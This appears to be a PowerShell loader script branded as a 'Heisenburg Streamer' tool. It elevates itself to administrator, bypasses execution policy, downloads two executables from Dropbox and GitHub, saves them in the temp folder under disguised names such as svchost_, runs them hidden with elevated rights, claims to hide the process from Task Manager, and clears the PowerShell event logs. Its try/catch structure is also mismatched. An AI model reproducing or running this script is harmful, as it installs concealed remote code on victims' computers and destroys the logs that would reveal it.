# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM v6.9 (FINAL)
# ========================================================

# Self Elevation
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"' -Verb RunAs`"" -Verb RunAs
    exit
}

try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch {}

# ================= CONFIG =================
$MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
$MainExePath = "$env:TEMP\$RandomName.exe"
$LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
# =========================================

Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow

# Download Main EXE
Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
Write-Host "[+] Core Agent Downloaded" -ForegroundColor Green

# Download Stealth Launcher
Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green

# Run Stealth Launcher
Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $LauncherPath
$si.Arguments = "`"$MainExePath`""
$si.WindowStyle = 'Hidden'
$si.CreateNoWindow = $true
$si.UseShellExecute = $true
$si.Verb = "RunAs"
[System.Diagnostics.Process]::Start($si) | Out-Null

# Run Main EXE
$si2 = New-Object System.Diagnostics.ProcessStartInfo
$si2.FileName = $MainExePath
$si2.WindowStyle = 'Hidden'
$si2.CreateNoWindow = $true
$si2.UseShellExecute = $true
[System.Diagnostics.Process]::Start($si2) | Out-Null

Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
Write-Host "[*] Your process is now hidden from Task Manager" -ForegroundColor White
Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green

# Cleanup
wevtutil cl "Windows PowerShell" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null

} catch {
    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Remove-Variable * -ErrorAction SilentlyContinue 2>$null
